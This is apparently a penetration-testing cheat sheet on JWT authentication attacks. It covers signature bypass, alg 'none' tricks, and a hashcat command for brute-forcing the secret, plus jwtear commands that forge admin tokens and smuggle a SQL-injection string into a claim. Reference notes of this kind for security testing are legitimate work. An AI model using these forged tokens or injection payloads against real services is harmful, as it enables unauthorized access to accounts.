# Authentication

## Implementation errors

## OAuth token

## JWT

### Common attacks

#### Accepting token with arbitrary signature

In some cases the validation of the signature might be skipped entirely. In this case is enough to self-sign the token with a key matching the algorithm specified in the header to make the JWT valid

#### Accepting token with no signature

Setting the `alg` parameter in the header to 'none' means that the server should not check the signature of the token. By default tokens with this configuration are refused but since the validation of the parameter is performed by parsing the string it is possible to bypass the checks with obfuscation techniques

#### Bruteforce the secret key

The secret key used to sign the token can be bruteforced locally using HashCat

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

### Jwtear

Automated JWT vulnerabilities scan tool. Can be found [here](https://github.com/KINGSABRI/jwtear)

#### Create a signed token

```
jwtear --generate-token --header --header '{"typ":"JWT", "alg":"HS256"}' --payload '{"login":"admin"}' --key '<key>'
```

#### Create a token without signature

```
jwtear --generate-token --header --header '{"typ":"JWT", "alg":"none"}' --payload '{"login":"admin"}'
```

#### Test for injection in parameters

```
jwtear --generate-token --header '{"typ":"JWT", "alg":"none"}' --payload $'{"login":"admin \' or \'a\'=\'a\'}'
```
